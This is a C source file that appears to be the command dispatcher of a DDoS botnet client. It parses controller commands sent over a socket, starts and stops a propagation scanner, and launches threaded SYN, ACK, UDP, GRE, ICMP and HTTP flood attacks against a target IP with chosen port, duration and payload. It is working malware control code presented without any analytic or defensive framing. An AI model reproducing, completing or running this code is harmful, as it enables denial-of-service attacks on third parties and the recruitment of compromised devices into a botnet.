#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/file.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <signal.h>

#include "headers/attack_params.h"
#include "headers/manager.h"
#include "headers/scanner.h"

#include "methods/ack_attack.h"
#include "methods/syn_attack.h"
#include "methods/gre_attack.h"
#include "methods/udpcustom_attack.h"
#include "methods/udpplain_attack.h"
#include "methods/icmp_attack.h"
#include "methods/http_attack.h"

#define MAX_THREADS 15

typedef enum {
    PARAM_TYPE_GENERIC,
    PARAM_TYPE_GRE_ICMP
} ParamType;

typedef struct {
    const char* name;
    void* (*handler)(void*);
    ParamType type;
} AttackCommand;

static const AttackCommand attack_commands[] = {
    {"!udpcustom", udpcustom_attack, PARAM_TYPE_GENERIC},
    {"!syn",       syn_attack,       PARAM_TYPE_GENERIC},
    {"!ack",       ack_attack,       PARAM_TYPE_GENERIC},
    {"!http",      http_attack,      PARAM_TYPE_GENERIC},
    {"!udpplain",  udpplain_attack,  PARAM_TYPE_GENERIC},
    {"!icmp",      icmp_attack,      PARAM_TYPE_GRE_ICMP},
    {"!gre",       gre_attack,       PARAM_TYPE_GRE_ICMP}
};

typedef struct {
    pthread_t thread;
    void* params;
    int active;
    int type;
} attack_thread_state;

static attack_thread_state thread_states[MAX_THREADS];
pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;

void init_thread_states() {
    memset(thread_states, 0, sizeof(thread_states));
    for (int i = 0; i < MAX_THREADS; i++) {
        thread_states[i].thread = 0;
        thread_states[i].params = NULL;
        thread_states[i].active = 0;
        thread_states[i].type = -1;
    }
}

void cleanup_attack_threads() {
    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (thread_states[i].active && thread_states[i].params) {
            if (thread_states[i].type == 0) {
                attack_params *ap = (attack_params*)thread_states[i].params;
                ap->active = 0;
            } else if (thread_states[i].type == 1) {
                ((gre_attack_params*)thread_states[i].params)->active = 0;
            }
        }
    }
    pthread_mutex_unlock(&thread_mutex);

    sleep(1);

    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (thread_states[i].thread != 0) {
            pthread_join(thread_states[i].thread, NULL);
            if (thread_states[i].params) {
                free(thread_states[i].params);
            }
            thread_states[i].thread = 0;
            thread_states[i].params = NULL;
            thread_states[i].active = 0;
            thread_states[i].type = -1;
        }
    }
    pthread_mutex_unlock(&thread_mutex);
}

static void reap_finished_threads() {
    for (int i = 0; i < MAX_THREADS; i++) {
        if (thread_states[i].thread != 0 && thread_states[i].active) {
            if (thread_states[i].type == 0) {
                attack_params *ap = (attack_params*)thread_states[i].params;
                if (ap && !ap->active) {
                    pthread_join(thread_states[i].thread, NULL);
                    free(thread_states[i].params);
                    thread_states[i].thread = 0;
                    thread_states[i].params = NULL;
                    thread_states[i].active = 0;
                    thread_states[i].type = -1;
                }
            } else if (thread_states[i].type == 1) {
                gre_attack_params *gp = (gre_attack_params*)thread_states[i].params;
                if (gp && !gp->active) {
                    pthread_join(thread_states[i].thread, NULL);
                    free(thread_states[i].params);
                    thread_states[i].thread = 0;
                    thread_states[i].params = NULL;
                    thread_states[i].active = 0;
                    thread_states[i].type = -1;
                }
            }
        }
    }
}

static int find_free_slot() {
    reap_finished_threads();
    for (int i = 0; i < MAX_THREADS; i++) {
        if (!thread_states[i].active && thread_states[i].thread == 0) {
            return i;
        }
    }
    return -1;
}

attack_params* create_attack_params(const char *ip, uint16_t port, int duration, int psize, int srcport, char *payload) {
    attack_params* params = calloc(1, sizeof(attack_params));
    if (!params) return NULL;

    params->target_addr.sin_family = AF_INET;
    params->target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &params->target_addr.sin_addr) != 1) {
        free(params);
        return NULL;
    }
    
    params->duration = duration;
    params->psize = psize;
    params->srcport = srcport;
    params->payload = payload ? strdup(payload) : NULL;
    params->active = 1;
    
    return params;
}

static gre_attack_params* create_gre_params(const char *ip, int duration, int psize, int srcport, int gre_proto, int gport) {
    gre_attack_params* params = calloc(1, sizeof(gre_attack_params));
    if (!params) return NULL;
    
    params->target_addr.sin_family = AF_INET;
    params->target_addr.sin_port = htons(gport);
    if (inet_pton(AF_INET, ip, &params->target_addr.sin_addr) != 1) {
        free(params);
        return NULL;
    }
    
    params->duration = duration;
    params->psize = psize;
    params->srcport = srcport;
    params->gre_proto = gre_proto;
    params->gport = gport;
    params->active = 1;
    
    return params;
}


void handle_command(char* command, int sock) {
    if (!command || strlen(command) > 1023) return;

    if (strncmp(command, "ping", 4) == 0) {
        char buffer[256];
        snprintf(buffer, sizeof(buffer), "pong %s", BArch);
        send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
        return;
    }

    if (strcmp(command, "stop") == 0) {
        cleanup_attack_threads();
        return;
    }

    if (strncmp(command, "scan_on", 7) == 0) {
        scanner_start(sock);
        return;
    }

    if (strncmp(command, "scan_off", 8) == 0) {
        scanner_stop();
        return;
    }

    const AttackCommand *found_cmd = NULL;
    int num_commands = sizeof(attack_commands) / sizeof(attack_commands[0]);

    for (int i = 0; i < num_commands; i++) {
        if (strncmp(command, attack_commands[i].name, strlen(attack_commands[i].name)) == 0) {
            found_cmd = &attack_commands[i];
            break;
        }
    }

    if (found_cmd) {
        char ip[32] = {0};
        char argstr[512] = {0};
        int n_scanned = 0;
        int port = 0, duration = 0;

        if (found_cmd->type == PARAM_TYPE_GRE_ICMP) {
            n_scanned = sscanf(command, "%*s %31s %d %511[^\n]", ip, &duration, argstr);
            if (n_scanned < 2) return;
        } else {
            n_scanned = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &duration, argstr);
            if (n_scanned < 3) return;
        }

        int psize = 0, srcport = 0, gre_proto = 0, gport = 0;
        char *payload = NULL;
        
        if (strlen(argstr) > 0) {
            char *token = strtok(argstr, " ");
            while (token) {
                if (strncmp(token, "psize=", 6) == 0) psize = atoi(token + 6);
                else if (strncmp(token, "srcport=", 8) == 0) srcport = atoi(token + 8);
                else if (strncmp(token, "proto=", 6) == 0) {
                    if (strcmp(token + 6, "tcp") == 0) gre_proto = 1;
                    else if (strcmp(token + 6, "udp") == 0) gre_proto = 2;
                }
                else if (strncmp(token, "payload=", 8) == 0) {
                    if (payload) free(payload);
                    payload = strdup(token + 8);
                }
                else if (strncmp(token, "gport=", 6) == 0) gport = atoi(token + 6);
                token = strtok(NULL, " ");
            }
        }
        
        pthread_mutex_lock(&thread_mutex);

        int slot = find_free_slot();
        if (slot < 0) {
            pthread_mutex_unlock(&thread_mutex);
            if (payload) free(payload);
            return;
        }

        void* params = NULL;
        int param_type_idx = -1;

        if (found_cmd->type == PARAM_TYPE_GRE_ICMP) {
            params = create_gre_params(ip, duration, psize, srcport, gre_proto, gport);
            param_type_idx = 1;
        } else {
            params = create_attack_params(ip, port, duration, psize, srcport, payload);
            param_type_idx = 0;
        }

        if (payload) {
            free(payload);
        }

        if (!params) {
            pthread_mutex_unlock(&thread_mutex);
            return;
        }

        int ret = pthread_create(&thread_states[slot].thread, NULL, found_cmd->handler, params);
        if (ret != 0) {
            free(params);
        } else {
            thread_states[slot].params = params;
            thread_states[slot].active = 1;
            thread_states[slot].type = param_type_idx;
        }

        pthread_mutex_unlock(&thread_mutex);
    }
}
